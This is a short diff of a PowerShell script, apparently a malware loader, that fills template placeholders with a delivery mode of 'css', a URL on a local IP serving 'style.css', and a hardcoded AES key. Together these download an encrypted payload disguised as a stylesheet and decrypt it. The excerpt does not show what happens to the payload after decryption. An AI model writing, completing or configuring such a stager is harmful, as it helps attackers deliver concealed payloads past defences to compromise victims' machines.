@@ -30,8 +30,8 @@ try {
 } catch {}
 
 # 📦 Download and extract encrypted payload
-$delivery = "REPLACE_DELIVERY"
-$url = "REPLACE_URL"
+$delivery = "css"
+$url = "http://192.168.0.11:8080/style.css"
 $e = ""
 
 switch ($delivery) {
@@ -79,7 +79,7 @@ $aes.Mode = 'CBC'
 $aes.Padding = 'PKCS7'
 $aes.KeySize = 256
 $aes.BlockSize = 128
-$key = [Text.Encoding]::UTF8.GetBytes("REPLACE_KEY")
+$key = [Text.Encoding]::UTF8.GetBytes("5a786376626e6d313233343536373839305a786376626e6d3132333435363738")
 $aes.Key = $key
 $aes.IV = $iv
 $dec = $aes.CreateDecryptor()
